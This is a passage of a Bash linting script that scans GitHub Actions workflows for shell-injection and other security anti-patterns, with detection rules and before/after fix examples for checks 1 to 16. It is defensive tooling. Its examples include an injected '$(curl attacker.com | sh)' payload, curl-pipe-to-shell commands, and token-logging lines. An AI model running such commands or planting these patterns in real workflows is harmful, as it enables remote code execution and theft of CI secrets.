#!/usr/bin/env bash
# SPDX-FileCopyrightText: © 2026 Tenstorrent Inc.
# SPDX-License-Identifier: Apache-2.0
# shellcheck disable=SC2034,SC2329
# SC2034: check_N_description/severity/aggregate vars are read via ${!varname} indirect expansion in run_check()
# SC2329: check_N() and example_check_N() functions are called via "${check_fn}"/"${example_fn}" dynamic dispatch
# GitHub Actions Security Linting Script
# Detects common shell injection and security anti-patterns in workflows/actions
#
# Usage: ./check-actions-security.sh [OPTIONS] [FILE...]
#   -h, --help    Show help message with check descriptions
#   --strict      Exit with error code if any issues found
#
# If no FILEs are provided, scans all .yml/.yaml files in .github/workflows and .github/actions.
#
# Inline suppression: add a YAML comment on the flagged line:
#   # NOLINT          suppress all checks on this line
#   # NOLINT(24)      suppress only check 24
#   # NOLINT(24,8)    suppress checks 24 and 8

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "${SCRIPT_DIR}/../../.." && pwd)"
GITHUB_DIR="${REPO_ROOT}/.github"

STRICT_MODE=false
MACHINE_OUTPUT=false
SKIP_AGGREGATE=false
FORMAT_RESULTS_FILE=""
ISSUES_FOUND=0
CHECKS_TO_RUN=()
CURRENT_CHECK=""
MAX_CHECK_NUM=52

RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
DIM='\033[2m'
NC='\033[0m'

# =============================================================================
# Usage / Help
# =============================================================================

usage() {
    cat <<'EOF'
Usage: ./check-actions-security.sh [OPTIONS] [FILE...]

Options:
  -h, --help              Show this help message and exit
  -c, --checks LIST       Run only specified checks (comma-separated, supports ranges)
                          Example: -c 1-3,19 runs checks 1, 2, 3, and 19
  --strict                Exit with error code if any issues found
  --machine-output        Output tab-delimited format for parallel processing
  --skip-aggregate        Skip aggregate checks (5, 6) for parallel workers
  --format-results FILE   Read results file and display with deduplicated examples

If no FILEs are provided, scans all .yml/.yaml files in .github/workflows and .github/actions.

Checks:
  1  Direct event data interpolation in run blocks (HIGH)
  2  eval usage (HIGH)
  3  bash -c with direct interpolation (MEDIUM)
  4  pull_request_target with checkout (HIGH)
  5  Unpinned external action references (LOW)
  6  secrets: inherit usage (LOW)
  7  Token exposure in logs (HIGH)
  8  Overly broad permissions (MEDIUM)
  9  Ref-based injection patterns (MEDIUM)
 10  curl | bash patterns (HIGH)
 11  inputs/outputs interpolation in run blocks (HIGH)
 12  Deprecated ::set-output/::save-state commands (MEDIUM)
 13  ACTIONS_ALLOW_UNSECURE_COMMANDS enabled (CRITICAL)
 14  toJSON() in run blocks (MEDIUM)
 15  Cross-repo reusable workflow mutable refs (HIGH)
 16  Additional attacker-controlled event fields (HIGH)
 17  github-script with expression interpolation (HIGH)
 18  secrets.* interpolation in run blocks (HIGH)
 19  matrix.* interpolation in run blocks (MEDIUM)
 20  github.repository/event_name in run blocks (LOW)
 21  pull_request_target privilege boundary issues (HIGH/MEDIUM)
 22  workflow_run privileged follow-up patterns (MEDIUM)
 23  self-hosted runners on untrusted triggers (HIGH)
 24  Write-capable permissions on untrusted triggers (MEDIUM)
 25  Mutable container and docker:// image references (MEDIUM)
 26  fromJSON() with attacker-controlled input (MEDIUM)
 27  Dynamic expression interpolation in 'uses:' (HIGH)
 28  Cache key injection patterns (MEDIUM)
 29  Artifact path expressions (MEDIUM)
 30  URL construction in HTTP clients (MEDIUM)
 31  Container volume mount expressions (MEDIUM)
 32  Expression interpolation in GITHUB_ENV/PATH/OUTPUT writes (HIGH)
 33  Missing explicit permissions key (LOW)
 34  Concurrency group with attacker-controlled data (MEDIUM)
 35  issue_comment trigger without authorization gate (MEDIUM)
 36  working-directory with attacker-controlled expressions (MEDIUM)
 37  github-script with inputs/outputs/secrets interpolation (HIGH)
 38  github-script dynamic code execution primitives (HIGH)
 39  Inline interpreter eval/exec patterns in run blocks (HIGH)
 40  github-script command execution APIs (HIGH)
 41  Inline interpreter command execution APIs (HIGH)
 42  Shell command execution from variables (HIGH)
 43  Remote script execution variants beyond pipes (HIGH)
 44  Attacker-controlled env vars written to GITHUB_ENV/PATH/OUTPUT (HIGH)
 45  Expression injection in 'if:' conditions (HIGH)
 46  Bracket notation bypass in expressions (HIGH)
 47  Additional attacker-controlled event contexts (HIGH)
 48  Export statements with direct interpolation (HIGH)
 49  Dynamic 'shell:' property expressions (MEDIUM)
 50  env.* context interpolation in run blocks (HIGH)
 51  github.ref/github.ref_name interpolation in run blocks (HIGH)
 52  Dynamic environment variable names (HIGH)
EOF
    exit 0
}

# =============================================================================
# Parse Check List (comma-separated with range support)
# =============================================================================

parse_checks() {
    local input="$1"
    local -a result=()

    input="${input%,}"
    IFS=',' read -ra parts <<< "${input}"
    for part in "${parts[@]}"; do
        part="${part// /}"  # Remove whitespace
        if [[ "${part}" =~ ^([0-9]+)-([0-9]+)$ ]]; then
            local start="${BASH_REMATCH[1]}"
            local end="${BASH_REMATCH[2]}"
            if [[ ${start} -gt ${end} ]]; then
                printf 'Error: Invalid range %s (start > end)\n' "${part}" >&2
                exit 1
            fi
            for ((i=start; i<=end; i++)); do
                if [[ ${i} -ge 1 && ${i} -le ${MAX_CHECK_NUM} ]]; then
                    result+=("${i}")
                else
                    printf 'Error: Check %s is out of range (valid: 1-%s)\n' "${i}" "${MAX_CHECK_NUM}" >&2
                    exit 1
                fi
            done
        elif [[ "${part}" =~ ^[0-9]+$ ]]; then
            if [[ ${part} -ge 1 && ${part} -le ${MAX_CHECK_NUM} ]]; then
                result+=("${part}")
            else
                printf 'Error: Check %s is out of range (valid: 1-%s)\n' "${part}" "${MAX_CHECK_NUM}" >&2
                exit 1
            fi
        else
            printf 'Error: Invalid check specification: %s\n' "${part}" >&2
            exit 1
        fi
    done

    CHECKS_TO_RUN=("${result[@]}")
}

# =============================================================================
# Argument Parsing
# =============================================================================

FILES=()
while [[ $# -gt 0 ]]; do
    case "$1" in
        -h|--help)
            usage
            ;;
        -c|--checks)
            if [[ -z "${2:-}" ]]; then
                printf 'Error: --checks requires an argument\n' >&2
                exit 1
            fi
            parse_checks "$2"
            shift 2
            ;;
        --strict)
            STRICT_MODE=true
            shift
            ;;
        --machine-output)
            MACHINE_OUTPUT=true
            shift
            ;;
        --skip-aggregate)
            SKIP_AGGREGATE=true
            shift
            ;;
        --format-results)
            if [[ -z "${2:-}" ]]; then
                printf 'Error: --format-results requires a file argument\n' >&2
                exit 1
            fi
            FORMAT_RESULTS_FILE="$2"
            shift 2
            ;;
        *)
            FILES+=("$1")
            shift
            ;;
    esac
done

# Default to all checks if none specified
if [[ ${#CHECKS_TO_RUN[@]} -eq 0 ]]; then
    mapfile -t CHECKS_TO_RUN < <(seq 1 "${MAX_CHECK_NUM}" || true)
fi

# =============================================================================
# Helper Functions
# =============================================================================

log_issue() {
    local severity="$1"
    local file="$2"
    local message="$3"
    local lines="${4:-}"

    # Apply NOLINT suppression: if every reported line has a matching NOLINT
    # comment, silently drop the finding.
    if [[ -n "${lines}" ]] && [[ -f "${file}" ]]; then
        lines=$(_filter_nolint "${lines}" "${file}" "${CURRENT_CHECK}")
        if [[ -z "${lines}" ]]; then
            return 0
        fi
    fi

    local file_display="${file}"
    if [[ -n "${lines}" ]]; then
        file_display="${file}:${lines}"
    fi

    if [[ "${MACHINE_OUTPUT}" == "true" ]]; then
        # Tab-delimited: CHECK<tab>SEVERITY<tab>FILE<tab>LINES<tab>MESSAGE
        printf '%s\t%s\t%s\t%s\t%s\n' "${CURRENT_CHECK}" "${severity}" "${file}" "${lines}" "${message}"
    else
        local color="${YELLOW}"
        if [[ "${severity}" == "CRITICAL" ]] || [[ "${severity}" == "HIGH" ]]; then
            color="${RED}"
        fi
        printf '%b[%s]%b %s: %s\n' "${color}" "${severity}" "${NC}" "${file_display}" "${message}"
    fi
    ISSUES_FOUND=$((ISSUES_FOUND + 1))
}

# Extract comma-separated line numbers (up to 5) from grep -n or awk NR output.
_extract_lines() {
    echo "$1" | awk -F: '{print $1+0}' | head -5 | paste -sd, -
}

# Check if a line has a NOLINT annotation that covers the given check number.
#   # NOLINT          -> suppresses all checks on this line
#   # NOLINT(24)      -> suppresses only check 24
#   # NOLINT(24,8)    -> suppresses checks 24 and 8
# Returns 0 (suppressed) or 1 (not suppressed).
_is_nolint() {
    local content="$1"
    local check_num="$2"
    case "${content}" in
        *NOLINT\(*) ;;
        *NOLINT*)  return 0 ;;
        *)         return 1 ;;
    esac
    local args="${content#*NOLINT(}"
    args="${args%%)*}"
    local IFS=','
    for num in ${args}; do
        num="${num## }"; num="${num%% }"
        [[ "${num}" == "${check_num}" ]] && return 0
    done
    return 1
}

# Filter line numbers through NOLINT annotations. Removes any line number
# whose source line contains a matching NOLINT comment. Returns the filtered
# comma-separated list, or empty string if all lines were suppressed.
_filter_nolint() {
    local lines="$1"
    local file="$2"
    local check_num="$3"
    local filtered=""
    IFS=',' read -ra _ln_arr <<< "${lines}"
    for _ln in "${_ln_arr[@]}"; do
        local _content
        _content=$(sed -n "${_ln}p" "${file}" 2>/dev/null || true)
        if _is_nolint "${_content}" "${check_num}"; then
            continue
        fi
        filtered="${filtered:+${filtered},}${_ln}"
    done
    echo "${filtered}"
}

# Prints a fix example for a check class (only once per class).
# Uses a delimited string instead of associative array for bash 3.2 compatibility.
_shown_examples="|"
log_fix_example() {
    local class="$1"
    local example="$2"

    case "${_shown_examples}" in
        *"|${class}|"*) return ;;
    esac
    _shown_examples="${_shown_examples}${class}|"

    local check_id="${class#check_}"
    printf '%b  Fix example (check %s):%b\n' "${CYAN}" "${check_id}" "${NC}"
    while IFS= read -r line; do
        printf '    %b%s%b\n' "${DIM}" "${line}" "${NC}"
    done <<< "${example}"
    echo ""
}

has_untrusted_trigger() {
    local file="$1"
    # Only check the on: trigger section, not the entire file
    awk '
        /^on:/ || /^"on":/ || /^on :/ { in_on = 1; next }
        in_on && /^[a-z]/ && !/^[[:space:]]/ { in_on = 0 }
        in_on && /^[[:space:]]*(pull_request_target|pull_request|issue_comment|issues|discussion|discussion_comment)[[:space:]]*:/ { found = 1; exit }
        in_on && /^[[:space:]]*(pull_request_target|pull_request|issue_comment|issues|discussion|discussion_comment)[[:space:]]*$/ { found = 1; exit }
        END { exit !found }
    ' "${file}" 2>/dev/null
}

# =============================================================================
# AWK Helper for Run Block Detection
# =============================================================================

# shellcheck disable=SC2016
AWK_RUN_BLOCK_DETECT='
    BEGIN { in_run_block = 0; run_indent = 0 }
    /^[[:space:]]*(-[[:space:]]+)?run:[[:space:]]*\|/ {
        match($0, /^[[:space:]]*/); run_indent = RLENGTH; in_run_block = 1; next
    }
    in_run_block {
        if ($0 ~ /^[[:space:]]*-[[:space:]]/) { in_run_block = 0; next }
        match($0, /^[[:space:]]*/); curr_indent = RLENGTH
        if (curr_indent <= run_indent && $0 ~ /^[[:space:]]*[a-z_-]+:/) { in_run_block = 0; next }
    }
'

# =============================================================================
# File List Population
# =============================================================================

if [[ ${#FILES[@]} -eq 0 ]]; then
    while IFS= read -r -d '' f; do
        FILES+=("${f}")
    done < <(find "${GITHUB_DIR}/workflows" "${GITHUB_DIR}/actions" \( -name "*.yml" -o -name "*.yaml" \) -print0 2>/dev/null || true)
fi

# =============================================================================
# Check 1: Direct input interpolation in run blocks (high risk patterns)
# =============================================================================
check_1_description="dangerous direct interpolation patterns"
check_1_severity="HIGH"

example_check_1() {
    cat <<'EOF'
# Why: ${{ }} expressions are macro-expanded into the shell script before execution.
# An attacker who controls a PR title or issue body can embed shell metacharacters
# (e.g. $(curl attacker.com | sh)) that execute arbitrary commands in the runner.
#
# BEFORE (unsafe - attacker controls PR title):
  run: echo "${{ github.event.pull_request.title }}"
# AFTER (safe - shell variable cannot inject commands):
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "${PR_TITLE}"
EOF
}

check_1() {
    local file="$1"
    local dangerous_patterns='github\.event\.(comment\.body|issue\.body|pull_request\.body|pull_request\.title)'
    if grep -qE "${dangerous_patterns}" "${file}" 2>/dev/null; then
        local unsafe_usage
        unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
            /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*github\.event\.(comment\.body|issue\.body|pull_request\.body|pull_request\.title)/ { print NR; next }
            in_run_block && /\$\{\{.*github\.event\.(comment\.body|issue\.body|pull_request\.body|pull_request\.title)/ { print NR }
        ' "${file}" 2>/dev/null)
        if [[ -n "${unsafe_usage}" ]]; then
            log_issue "HIGH" "${file}" "Contains dangerous event data interpolation directly in run: block (comment/issue/PR body/title)" "$(_extract_lines "${unsafe_usage}")"
            return 1
        fi
    fi
    return 0
}

# =============================================================================
# Check 2: eval usage
# =============================================================================
check_2_description="eval usage"
check_2_severity="HIGH"

example_check_2() {
    cat <<'EOF'
# Why: eval re-parses its argument as shell code. If any variable in the evaluated
# string came from untrusted input (even via env var), the attacker gets arbitrary
# command execution on the runner.
#
# BEFORE (unsafe - eval interprets arbitrary code):
  run: eval "${USER_INPUT}"
# AFTER (safe - use direct execution or a case/switch):
  run: |
    case "${VALIDATED_CMD}" in
      build)  make build ;;
      test)   make test ;;
      *)      echo "Unknown command"; exit 1 ;;
    esac
EOF
}

check_2() {
    local file="$1"
    local hits
    hits=$(grep -nE 'eval\s' "${file}" 2>/dev/null || true)
    if [[ -n "${hits}" ]]; then
        log_issue "HIGH" "${file}" "Contains 'eval' statement - consider safer alternatives" "$(_extract_lines "${hits}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 3: bash -c with direct ${{ }} interpolation
# =============================================================================
check_3_description="bash -c with direct interpolation"
check_3_severity="MEDIUM"

example_check_3() {
    cat <<'EOF'
# Why: bash -c takes a string and executes it as shell code. When ${{ }} expressions
# appear in that string, they are expanded before bash sees them, so attacker-controlled
# values become part of the shell command.
#
# BEFORE (unsafe - interpolation happens before shell parsing):
  run: bash -c "echo ${{ inputs.command }}"
# AFTER (safe - pass via env var):
  env:
    CMD: ${{ inputs.command }}
  run: bash -c "echo \"${CMD}\""
EOF
}

check_3() {
    local file="$1"
    local hits
    hits=$(grep -nE 'bash.*-c.*\$\{\{' "${file}" 2>/dev/null || true)
    if [[ -n "${hits}" ]]; then
        log_issue "MEDIUM" "${file}" "Contains 'bash -c' with direct \${{ }} - ensure input is via env var" "$(_extract_lines "${hits}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 4: pull_request_target with potentially unsafe patterns
# =============================================================================
check_4_description="pull_request_target with checkout"
check_4_severity="HIGH"

example_check_4() {
    cat <<'EOF'
# Why: pull_request_target runs with the base repository's secrets and write token
# but can check out the PR author's fork code. If the checkout uses the PR head ref,
# the fork's code runs with full repository privileges — giving an external contributor
# access to secrets and write permissions they should never have.
#
# pull_request_target runs with BASE repo privileges but can check out HEAD code.
# BEFORE (unsafe - checks out and runs untrusted fork code with write token):
  on: pull_request_target
  steps:
    - uses: actions/checkout@v4
      with: { ref: ${{ github.event.pull_request.head.sha }} }
    - run: make test  # <-- runs fork code with base repo secrets!
# AFTER (safe - only check out base, or use a separate unprivileged job):
  on: pull_request_target
  steps:
    - uses: actions/checkout@v4  # checks out base branch by default
    - run: make test
EOF
}

check_4() {
    local file="$1"
    if grep -qE 'pull_request_target' "${file}" 2>/dev/null; then
        local hits
        hits=$(grep -nE 'actions/checkout' "${file}" 2>/dev/null || true)
        if [[ -n "${hits}" ]]; then
            log_issue "HIGH" "${file}" "Uses pull_request_target with checkout - verify PR code is not executed unsafely" "$(_extract_lines "${hits}")"
            return 1
        fi
    fi
    return 0
}

# =============================================================================
# Check 5: Count unpinned external action references (aggregate check)
# =============================================================================
check_5_description="unpinned external action references"
check_5_severity="LOW"
check_5_aggregate=true

example_check_5() {
    cat <<'EOF'
# Why: Mutable tags like @v4 can be force-pushed to point to different code at any time.
# A compromised or malicious upstream action maintainer can push new code under the same
# tag, affecting all consumers silently. Pinning to a full SHA ensures you run exactly
# the code you audited.
#
# BEFORE (mutable tag - can be moved to point to different code):
  uses: actions/checkout@v4
# AFTER (pinned to immutable commit SHA):
  uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
EOF
}

check_5() {
    local external_unpinned=0
    for file in "$@"; do
        local count
        count=$(awk '
            /^[[:space:]]*-[[:space:]]*uses:[[:space:]]*[^.#[:space:]][^[:space:]#]*@|^[[:space:]]*uses:[[:space:]]*[^.#[:space:]][^[:space:]#]*@/ {
                ref = $0
                sub(/^[[:space:]]*-[[:space:]]*uses:[[:space:]]*/, "", ref)
                sub(/^[[:space:]]*uses:[[:space:]]*/, "", ref)
                sub(/[[:space:]]+#.*$/, "", ref)
                gsub(/^[\"\047]|[\"\047]$/, "", ref)

                if (ref ~ /^docker:\/\//) next
                if (ref ~ /^\.\//) next
                if (ref ~ /^tenstorrent\//) next
                if (ref ~ /\/\.github\/workflows\//) next

                n = split(ref, parts, "@")
                refspec = parts[n]
                if (refspec !~ /^[a-f0-9]{40}$/) {
                    count++
                }
            }
            END { print count + 0 }
        ' "${file}" 2>/dev/null)
        count="${count:-0}"
        if [[ "${count}" =~ ^[0-9]+$ ]]; then
            external_unpinned=$((external_unpinned + count))
        fi
    done
    external_unpinned="${external_unpinned:-0}"
    if [[ "${external_unpinned}" =~ ^[0-9]+$ ]] && [[ "${external_unpinned}" -gt 0 ]]; then
        log_issue "LOW" "Multiple files" "Found ${external_unpinned} external actions not pinned to a full commit SHA - consider pinning to immutable refs"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 6: Count secrets: inherit usage (aggregate check)
# =============================================================================
check_6_description="secrets: inherit usage"
check_6_severity="LOW"
check_6_aggregate=true

example_check_6() {
    cat <<'EOF'
# Why: secrets: inherit passes every repository secret to the called workflow. If that
# workflow is compromised or has a vulnerability, all secrets are exposed rather than
# just the ones it needs. Explicit secret passing limits the blast radius.
#
# BEFORE (passes ALL repo secrets to called workflow):
  uses: ./.github/workflows/build.yaml
  secrets: inherit
# AFTER (passes only the secrets the called workflow needs):
  uses: ./.github/workflows/build.yaml
  secrets:
    DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
EOF
}

check_6() {
    local secrets_inherit_count=0
    for file in "$@"; do
        if grep -qE 'secrets:\s*inherit' "${file}" 2>/dev/null; then
            secrets_inherit_count=$((secrets_inherit_count + 1))
        fi
    done
    if [[ "${secrets_inherit_count}" -gt 50 ]]; then
        log_issue "LOW" "Multiple files" "Found ${secrets_inherit_count} workflows using 'secrets: inherit' - consider explicit secret passing"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 7: GITHUB_TOKEN or ACTIONS_RUNTIME_TOKEN exposure in logs
# =============================================================================
check_7_description="potential token exposure in logs"
check_7_severity="HIGH"

example_check_7() {
    cat <<'EOF'
# Why: GitHub auto-masks GITHUB_TOKEN in logs, but only when it recognizes the pattern.
# Printing tokens via echo or printf can bypass masking in some contexts, potentially
# exposing credentials in publicly visible workflow logs.
#
# BEFORE (token value visible in workflow logs):
  run: echo "Token: ${GITHUB_TOKEN}"
  run: printf '%s\n' "${GITHUB_TOKEN}"
  run: python -c "import os; print(os.environ.get('GITHUB_TOKEN'))"
# AFTER (use token directly without logging, or mask it):
  run: |
    echo "::add-mask::${GITHUB_TOKEN}"
    curl -H "Authorization: Bearer ${GITHUB_TOKEN}" ...
EOF
}

check_7() {
    local file="$1"
    local hits
    hits=$(grep -nE '(echo|printf).*\$\{?\{?(GITHUB_TOKEN|ACTIONS_RUNTIME_TOKEN|ACTIONS_ID_TOKEN_REQUEST_TOKEN)|print\s*\(.*(GITHUB_TOKEN|ACTIONS_RUNTIME_TOKEN|ACTIONS_ID_TOKEN_REQUEST_TOKEN)' "${file}" 2>/dev/null || true)
    if [[ -n "${hits}" ]]; then
        log_issue "HIGH" "${file}" "Potential token exposure in echo/printf/print statement" "$(_extract_lines "${hits}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 8: Overly broad permissions
# =============================================================================
check_8_description="overly broad permissions"
check_8_severity="MEDIUM"

example_check_8() {
    cat <<'EOF'
# Why: write-all grants the workflow token full write access to every scope (contents,
# packages, pull-requests, etc.). If any step is compromised, the attacker inherits all
# those permissions. Least-privilege scoping limits what a compromised step can do.
#
# BEFORE (grants write access to everything):
  permissions: write-all
# AFTER (grant only what is needed):
  permissions:
    contents: read
    pull-requests: write
EOF
}

check_8() {
    local file="$1"
    local hits
    hits=$(grep -nE 'permissions:.*write-all|write-all' "${file}" 2>/dev/null || true)
    if [[ -n "${hits}" ]]; then
        log_issue "MEDIUM" "${file}" "Uses 'write-all' permissions - apply principle of least privilege" "$(_extract_lines "${hits}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 9: Ref-based injection vectors (head.ref, base.ref in ${{ }})
# =============================================================================
check_9_description="ref-based injection patterns"
check_9_severity="MEDIUM"

example_check_9() {
    cat <<'EOF'
# Why: Branch names are attacker-controlled in PRs — a fork author can name their branch
# anything, including strings with shell metacharacters. When ${{ github.head_ref }} is
# expanded into a run: block, the branch name becomes part of the shell command.
#
# BEFORE (unsafe - branch name can contain shell metacharacters):
  run: echo "Branch: ${{ github.head_ref }}"
# AFTER (safe - shell variable is not re-parsed):
  env:
    HEAD_REF: ${{ github.head_ref }}
  run: echo "Branch: ${HEAD_REF}"
EOF
}

check_9() {
    local file="$1"
    if grep -qE '\$\{\{.*(\.head[_.]ref|\.base[_.]ref|github\.head_ref|github\.base_ref)' "${file}" 2>/dev/null; then
        local unsafe_usage
        unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
            /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*(\.head[_.]ref|\.base[_.]ref|github\.head_ref|github\.base_ref)/ { print NR; next }
            in_run_block && /\$\{\{.*(\.head[_.]ref|\.base[_.]ref|github\.head_ref|github\.base_ref)/ { print NR }
        ' "${file}" 2>/dev/null)
        if [[ -n "${unsafe_usage}" ]]; then
            log_issue "MEDIUM" "${file}" "Contains head.ref/base.ref interpolation directly in run: block - use env var instead" "$(_extract_lines "${unsafe_usage}")"
            return 1
        fi
    fi
    return 0
}

# =============================================================================
# Check 10: curl | bash patterns
# =============================================================================
check_10_description="curl pipe to shell patterns"
check_10_severity="HIGH"

example_check_10() {
    cat <<'EOF'
# Why: Piping a remote script directly into a shell executes it without any opportunity
# to inspect or verify the content. A compromised or MITM'd server can serve arbitrary
# code. Download first, verify a checksum, then execute.
#
# BEFORE (unsafe - executes remote code without verification):
  run: curl -sSL https://example.com/install.sh | bash
# AFTER (safe - download, inspect, then execute):
  run: |
    curl -sSL -o install.sh https://example.com/install.sh
    sha256sum -c <<< "expected_hash  install.sh"
    bash install.sh
EOF
}

check_10() {
    local file="$1"
    local hits
    hits=$(grep -nE 'curl.*\|\s*(ba)?sh|wget.*\|\s*(ba)?sh' "${file}" 2>/dev/null || true)
    if [[ -n "${hits}" ]]; then
        log_issue "HIGH" "${file}" "Contains 'curl | bash' pattern - download and verify scripts before execution" "$(_extract_lines "${hits}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 11: inputs.*, steps.*.outputs.*, and needs.*.outputs.* direct interpolation
# =============================================================================
check_11_description="inputs/outputs interpolation in run blocks"
check_11_severity="HIGH"

example_check_11() {
    cat <<'EOF'
# Why: inputs.*, steps.*.outputs.*, and needs.*.outputs.* are string values textually
# substituted into the shell script via ${{ }}. If any contain shell metacharacters, they
# become part of the executed command. Assigning to an env var first ensures the value is
# treated as data, not code.
#
# BEFORE (unsafe - input/output is macro-expanded into shell code):
  run: echo "${{ needs.build.outputs.pr-number }}"
# AFTER (safe - assign to env var, reference as shell variable):
  env:
    PR_NUMBER: ${{ needs.build.outputs.pr-number }}
  run: echo "${PR_NUMBER}"
EOF
}

check_11() {
    local file="$1"
    if grep -qE '\$\{\{.*(inputs\.|steps\.[^}]+\.outputs\.|needs\.[^}]+\.outputs\.)' "${file}" 2>/dev/null; then
        local unsafe_usage
        unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
            /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*(inputs\.|steps\.[^}]+\.outputs\.|needs\.[^}]+\.outputs\.)/ { print NR; next }
            in_run_block && /\$\{\{.*(inputs\.|steps\.[^}]+\.outputs\.|needs\.[^}]+\.outputs\.)/ { print NR }
        ' "${file}" 2>/dev/null)
        if [[ -n "${unsafe_usage}" ]]; then
            log_issue "HIGH" "${file}" "Contains \${{ inputs.* }}, \${{ steps.*.outputs.* }}, or \${{ needs.*.outputs.* }} directly in run: block - use env var instead" "$(_extract_lines "${unsafe_usage}")"
            return 1
        fi
    fi
    return 0
}

# =============================================================================
# Check 12: Deprecated ::set-output and ::save-state workflow commands
# =============================================================================
check_12_description="deprecated workflow commands"
check_12_severity="MEDIUM"

example_check_12() {
    cat <<'EOF'
# Why: ::set-output and ::save-state workflow commands are processed from stdout. Any
# step that prints to stdout can inject fake output values, potentially affecting
# downstream steps. The file-based $GITHUB_OUTPUT/$GITHUB_STATE replacements are not
# vulnerable to this log-injection attack.
#
# BEFORE (deprecated - vulnerable to log injection):
  run: echo "::set-output name=result::${VALUE}"
# AFTER (safe - writes to environment file):
  run: echo "result=${VALUE}" >> "${GITHUB_OUTPUT}"
EOF
}

check_12() {
    local file="$1"
    local hits
    hits=$(grep -nE '::set-output |::save-state ' "${file}" 2>/dev/null || true)
    if [[ -n "${hits}" ]]; then
        log_issue "MEDIUM" "${file}" "Uses deprecated ::set-output or ::save-state command - use \$GITHUB_OUTPUT/\$GITHUB_STATE files instead" "$(_extract_lines "${hits}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 13: ACTIONS_ALLOW_UNSECURE_COMMANDS re-enabled
# =============================================================================
check_13_description="ACTIONS_ALLOW_UNSECURE_COMMANDS"
check_13_severity="CRITICAL"

example_check_13() {
    cat <<'EOF'
# Why: This env var re-enables the ::set-env and ::add-path workflow commands that were
# disabled due to CVE-2020-15228. Those commands let any process that writes to stdout
# modify environment variables for subsequent steps, enabling arbitrary code execution
# via LD_PRELOAD or PATH manipulation.
#
# BEFORE (critical - re-enables commands disabled for CVE-2020-15228):
  env:
    ACTIONS_ALLOW_UNSECURE_COMMANDS: true
  run: echo "::set-env name=PATH::${NEW_PATH}"
# AFTER (safe - use GITHUB_ENV and GITHUB_PATH files):
  run: |
    echo "PATH=${NEW_PATH}" >> "${GITHUB_ENV}"
    echo "/new/bin" >> "${GITHUB_PATH}"
EOF
}

check_13() {
    local file="$1"
    local hits
    hits=$(grep -nE 'ACTIONS_ALLOW_UNSECURE_COMMANDS.*true' "${file}" 2>/dev/null || true)
    if [[ -n "${hits}" ]]; then
        log_issue "CRITICAL" "${file}" "Enables ACTIONS_ALLOW_UNSECURE_COMMANDS - this re-enables dangerous set-env/add-path commands (CVE-2020-15228)" "$(_extract_lines "${hits}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 14: toJSON() in run blocks
# =============================================================================
check_14_description="toJSON() in run blocks"
check_14_severity="MEDIUM"

example_check_14() {
    cat <<'EOF'
# WHY: toJSON() produces a JSON string that may contain quotes, newlines, or
# backslashes. When expanded via ${{ }} into a shell script, these characters
# break out of string context and can inject arbitrary shell commands.
# Assign the JSON to an env var so the shell treats it as an opaque string.
#
# BEFORE (unsafe - JSON quotes/newlines can break shell context):
  run: |
    data='${{ toJSON(matrix.config) }}'
    echo "${data}" | jq .
# AFTER (safe - env var preserves JSON without shell re-parsing):
  env:
    CONFIG_JSON: ${{ toJSON(matrix.config) }}
  run: |
    echo "${CONFIG_JSON}" | jq .
EOF
}

check_14() {
    local file="$1"
    if grep -qE 'toJSON\(' "${file}" 2>/dev/null; then
        local unsafe_usage
        unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
            /^[[:space:]]*(-[[:space:]]+)?run:/ && /toJSON\(/ { print NR; next }
            in_run_block && /toJSON\(/ { print NR }
        ' "${file}" 2>/dev/null)
        if [[ -n "${unsafe_usage}" ]]; then
            log_issue "MEDIUM" "${file}" "Uses toJSON() directly in run: block - JSON can break shell quoting; assign to env var first" "$(_extract_lines "${unsafe_usage}")"
            return 1
        fi
    fi
    return 0
}

# =============================================================================
# Check 15: Cross-repo reusable workflow calls with mutable refs
# =============================================================================
check_15_description="cross-repo reusable workflow calls with mutable refs"
check_15_severity="HIGH"

example_check_15() {
    cat <<'EOF'
# WHY: Reusable workflows referenced by branch or tag can be silently changed
# by the upstream maintainer. A compromised external repo could push malicious
# code to `main` or retag a version. Pinning to a full commit SHA ensures
# immutability.
#
# BEFORE (unsafe - branch can be modified by anyone with push access):
  uses: org/repo/.github/workflows/build.yaml@main
# AFTER (safe - pinned to immutable commit):
  uses: org/repo/.github/workflows/build.yaml@abc123def456... # main
# To get the SHA: git ls-remote https://github.com/org/repo refs/heads/main
EOF
}

check_15() {
    local file="$1"
    local unsafe_calls
    unsafe_calls=$(awk '
        /^[[:space:]]*uses:[[:space:]]*[^.#[:space:]][^[:space:]#]*\/\.github\/workflows\/[^[:space:]#]+@/ {
            ref = $0
            sub(/^[[:space:]]*uses:[[:space:]]*/, "", ref)
            sub(/[[:space:]]+#.*$/, "", ref)
            gsub(/^[\"\047]|[\"\047]$/, "", ref)
            n = split(ref, parts, "@")
            refspec = parts[n]
            if (refspec !~ /^[a-f0-9]{40}$/) {
                print NR
            }
        }
    ' "${file}" 2>/dev/null)
    if [[ -n "${unsafe_calls}" ]]; then
        log_issue "HIGH" "${file}" "Cross-repo reusable workflow call uses mutable ref instead of commit SHA - pin to full SHA" "$(_extract_lines "${unsafe_calls}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 16: Additional attacker-controlled event context in run blocks
# =============================================================================
check_16_description="additional attacker-controlled event fields in run blocks"
